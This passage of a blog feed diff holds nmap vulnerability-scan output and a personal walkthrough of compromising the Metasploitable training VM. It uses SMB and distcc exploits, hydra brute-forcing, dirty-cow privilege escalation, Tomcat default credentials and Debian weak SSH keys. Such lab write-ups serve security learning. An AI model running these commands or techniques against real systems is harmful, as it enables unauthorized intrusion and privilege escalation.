+|   /tikiwiki/: Tikiwiki<br>
+|   /test/: Test page<br>
+|   /phpinfo.php: Possible information file<br>
+|   /phpMyAdmin/: phpMyAdmin<br>
+|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'<br>
+|   /icons/: Potentially interesting folder w/ directory listing<br>
+|_  /index/: Potentially interesting folder<br>
+|<em>http-csrf: Couldn't find any CSRF vulnerabilities.<br>
+|<em>http-stored-xss: Couldn't find any stored XSS vulnerabilities.<br>
+|<em>http-phpself-xss: ERROR: Script execution failed (use -d to debug)<br>
+|<em>http-trace: TRACE is enabled<br>
+|<em>http-dombased-xss: Couldn't find any DOM based XSS.<br>
+|<em>http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>
+111/tcp   open  rpcbind<br>
+139/tcp   open  netbios-ssn<br>
+445/tcp   open  microsoft-ds<br>
+512/tcp   open  exec<br>
+513/tcp   open  login<br>
+514/tcp   open  shell<br>
+1099/tcp  open  rmiregistry<br>
+| rmi-vuln-classloader:<br>
+|   VULNERABLE:<br>
+|   RMI registry default configuration remote code execution vulnerability<br>
+|     State: VULNERABLE<br>
+|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.<br>
+|<br>
+|     References:<br>
+|</em>      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb<br>
+1524/tcp  open  ingreslock<br>
+2049/tcp  open  nfs<br>
+2121/tcp  open  ccproxy-ftp<br>
+3306/tcp  open  mysql<br>
+|<em>ssl-ccs-injection: No reply from server (TIMEOUT)<br>
+3632/tcp  open  distccd<br>
+| distcc-cve2004-2687:<br>
+|   VULNERABLE:<br>
+|   distcc Daemon Command Execution<br>
+|     State: VULNERABLE (Exploitable)<br>
+|     IDs:  CVE:CVE-2004-2687<br>
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)<br>
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and<br>
+|       earlier. The vulnerability is the consequence of weak service configuration.<br>
+|<br>
+|     Disclosure date: 2002-02-01<br>
+|     Extra information:<br>
+|<br>
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)<br>
+|<br>
+|     References:<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687<br>
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687<br>
+|</em>      https://distcc.github.io/security.html<br>
+5432/tcp  open  postgresql<br>
+| ssl-poodle:<br>
+|   VULNERABLE:<br>
+|   SSL POODLE information leak<br>
+|     State: VULNERABLE<br>
+|     IDs:  BID:70574  CVE:CVE-2014-3566<br>
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other<br>
+|           products, uses nondeterministic CBC padding, which makes it easier<br>
+|           for man-in-the-middle attackers to obtain cleartext data via a<br>
+|           padding-oracle attack, aka the &quot;POODLE&quot; issue.<br>
+|     Disclosure date: 2014-10-14<br>
+|     Check results:<br>
+|       TLS_RSA_WITH_AES_128_CBC_SHA<br>
+|     References:<br>
+|       https://www.securityfocus.com/bid/70574<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>
+|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>
+|</em>      https://www.openssl.org/~bodo/ssl-poodle.pdf<br>
+| ssl-dh-params:<br>
+|   VULNERABLE:<br>
+|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>
+|     State: VULNERABLE<br>
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups<br>
+|       of insufficient strength, especially those using one of a few commonly<br>
+|       shared groups, may be susceptible to passive eavesdropping attacks.<br>
+|     Check results:<br>
+|       WEAK DH GROUP 1<br>
+|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA<br>
+|             Modulus Type: Safe prime<br>
+|             Modulus Source: Unknown/Custom-generated<br>
+|             Modulus Length: 1024<br>
+|             Generator Length: 8<br>
+|             Public Key Length: 1024<br>
+|     References:<br>
+|</em>      https://weakdh.org<br>
+| ssl-ccs-injection:<br>
+|   VULNERABLE:<br>
+|   SSL/TLS MITM vulnerability (CCS Injection)<br>
+|     State: VULNERABLE<br>
+|     Risk factor: High<br>
+|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h<br>
+|       does not properly restrict processing of ChangeCipherSpec messages,<br>
+|       which allows man-in-the-middle attackers to trigger use of a zero<br>
+|       length master key in certain OpenSSL-to-OpenSSL communications, and<br>
+|       consequently hijack sessions or obtain sensitive information, via<br>
+|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.<br>
+|<br>
+|     References:<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224<br>
+|       http://www.openssl.org/news/secadv_20140605.txt<br>
+|</em>      http://www.cvedetails.com/cve/2014-0224<br>
+5900/tcp  open  vnc<br>
+6000/tcp  open  X11<br>
+6667/tcp  open  irc<br>
+| irc-botnet-channels:<br>
+|</em>  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.<br>
+6697/tcp  open  ircs-u<br>
+| irc-botnet-channels:<br>
+|</em>  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.<br>
+|<em>ssl-ccs-injection: No reply from server (TIMEOUT)<br>
+8009/tcp  open  ajp13<br>
+8180/tcp  open  unknown<br>
+| http-slowloris-check:<br>
+|   VULNERABLE:<br>
+|   Slowloris DOS attack<br>
+|     State: LIKELY VULNERABLE<br>
+|     IDs:  CVE:CVE-2007-6750<br>
+|       Slowloris tries to keep many connections to the target web server open and hold<br>
+|       them open as long as possible.  It accomplishes this by opening connections to<br>
+|       the target web server and sending a partial request. By doing so, it starves<br>
+|       the http server's resources causing Denial Of Service.<br>
+|<br>
+|     Disclosure date: 2009-09-17<br>
+|     References:<br>
+|       http://ha.ckers.org/slowloris/<br>
+|</em>      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>
+| http-enum:<br>
+|   /admin/: Possible admin folder<br>
+|   /admin/index.html: Possible admin folder<br>
+|   /admin/login.html: Possible admin folder<br>
+|   /admin/admin.html: Possible admin folder<br>
+|   /admin/account.html: Possible admin folder<br>
+|   /admin/admin_login.html: Possible admin folder<br>
+|   /admin/home.html: Possible admin folder<br>
+|   /admin/admin-login.html: Possible admin folder<br>
+|   /admin/adminLogin.html: Possible admin folder<br>
+|   /admin/controlpanel.html: Possible admin folder<br>
+|   /admin/cp.html: Possible admin folder<br>
+|   /admin/index.jsp: Possible admin folder<br>
+|   /admin/login.jsp: Possible admin folder<br>
+|   /admin/admin.jsp: Possible admin folder<br>
+|   /admin/home.jsp: Possible admin folder<br>
+|   /admin/controlpanel.jsp: Possible admin folder<br>
+|   /admin/admin-login.jsp: Possible admin folder<br>
+|   /admin/cp.jsp: Possible admin folder<br>
+|   /admin/account.jsp: Possible admin folder<br>
+|   /admin/admin_login.jsp: Possible admin folder<br>
+|   /admin/adminLogin.jsp: Possible admin folder<br>
+|   /manager/html/upload: Apache Tomcat (401 Unauthorized)<br>
+|   /manager/html: Apache Tomcat (401 Unauthorized)<br>
+|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload<br>
+|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload<br>
+|   /admin/jscript/upload.html: Lizard Cart/Remote File upload<br>
+|_  /webdav/: Potentially interesting folder<br>
+8787/tcp  open  msgsrvr<br>
+38316/tcp open  unknown<br>
+44372/tcp open  unknown<br>
+50889/tcp open  unknown<br>
+55138/tcp open  unknown</p>
+<p>Host script results:<br>
+|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)<br>
+|_smb-vuln-ms10-054: false<br>
+|_smb-vuln-ms10-061: false</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Metasploitable-1 ]]></title>
+        <id>https://yidwfnyetg.github.io/post/metasploitable-1/</id>
+        <link href="https://yidwfnyetg.github.io/post/metasploitable-1/">
+        </link>
+        <updated>2023-02-01T09:26:43.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<blockquote>
+<p>参考教程：<br>
+<a href="https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/">https://hack1ng4fun.github.io/2020/03/26/靶机-Metasploitable-1/</a></p>
+</blockquote>
+<!-- more -->
+<p>扫描端口结果：<br>
+sudo nmap -sV -Pn -T4 -p 1-65535 -O 192.168.124.28</p>
+<!-- more -->
+<h1 id="方法1smb漏洞进入">方法1：SMB漏洞进入</h1>
+<p>查看smb版本:<br>
+smbmap -H 192.168.124.28</p>
+<p>get the version of smb: 3.0.20,we have known that smb-3.0.x has a vulnerablity (CVE-2007-2447）.<br>
+Then we can use msf to exploit it.</p>
+<p>it's root privilege.</p>
+<!-- more -->
+<h1 id="方法2weak-passwordfail">方法2：Weak password(FAIL)</h1>
+<p>Use smb_enumusers to scan users,then arrage result to file &quot;users&quot;<br>
+my smb_enumusers didn't return unexpected result. the result is as follows:</p>
+<p>Unfortunately,I failed,I don't know why.I expected future of me to tell myself.<br>
+brust user of ftp,telnet,ssh,smb,MySQL,PostgreSQL<br>
+hydra -L users -e nsr ftp://192.168.124.28 -o ftpuser<br>
+hydra -L users -e nsr ssh://192.168.124.28 -o sshuser<br>
+hydra -L users -e nsr telnet://192.168.124.28 -o telnetuser<br>
+hydra -L users -e nsr smb://192.168.124.28 -o smbuser<br>
+hydra -L users -e nsr mysql://192.168.124.28 -o mysqluser<br>
+hydra -L users -e nsr postgres://192.168.124.28 -o postgresqluser<br>
+&quot;-e nsr&quot; means try &quot;n&quot; null password<br>
+user msfadmin has root privilege.<br>
+sudo -i  change to root user.</p>
+<!-- more -->
+<h1 id="method-3cve-2004-2687">Method 3:（CVE-2004-2687）</h1>
+<p>There is a weak passwd:root/root in mysql</p>
+<p>Use nmap for vulnerability scanning:<br>
+nmap --script vuln 192.168.124.28 -p- open<br>
+The screenshot is as follows:(the picture is so big that I can't paste it )<br>
+📎扫描结果.txt<br>
+We find a vulnerability CVE-2004-2687</p>
+<p>Use msf to exploit it,unfortunately,I failed again.I don't know why.</p>
+<p>Exploit failed: A payload has not been selected</p>
+<p>Next is escalating privilege.<br>
+Check scheduled tasks:</p>
+<p>All scripts are running with root privilege and have no &quot;write&quot; privilege.<br>
+For convenience,I transform shell to &quot;meterpreter shell&quot;</p>
+<p>Use kernel vulnerability to escalate privilege.<br>
+I am counting on &quot;dirty-cow&quot; .<br>
+upload /home/kali/Desktop/dirty.c /var/spool/cron</p>
+<p>shell<br>
+gcc -pthread dirty.c -lcrypt -o dirty<br>
+chmod +x dirty<br>
+./dirty fly</p>
+<p>Then I get an account &quot;firefart:fly&quot;</p>
+<!-- more -->
+<h1 id="method-4">Method 4:</h1>
+<p>The target's port 80 is open,scan its directory<br>
+dirb http://192.168.124.28 /usr/share/wordlists/dirb/big.txt<br>
+find a url : http://192.168.124.28/tikiwiki/<br>
+try admin:admin to login(I have change password from admin to 123456 now)<br>
+Use msf to exploit it again</p>
+<p>It's account:&quot;ww-data&quot;<br>
+Use CVE-2009-1185 to escalate privilege.</p>
+<p>Now,it's accont &quot;firefart',because I have used dirty-cow in method3</p>
+<!-- more -->
+<h1 id="method-5">Method 5:</h1>
+<p>I have find port 8180 in nmap result,<br>
+It's a website based on tomcat.Login it depend on weak password &quot;tomcat:tomcat&quot;</p>
+<p>searchsploit it...<br>
+Can deploy war to getshell.For convenience ,use msf</p>
+<p>it's account &quot; tomcat55&quot;.Need privilege escalation.<br>
+find authoized_keys in /root/.ssh/ ,it's target's public key.<br>
+After checking, it is found that the OpenSSL version on the target host is within the vulnerability range.</p>
+<p>Download key pairs on the internet,<br>
+use 'grep' command to find the matching public key file<br>
+Remove the suffix name of the public key file to create the corresponding private key file.</p>
+<p>Use this private key file to log in to the root user of the target host.</p>
+]]></content>
+    </entry>
+</feed>
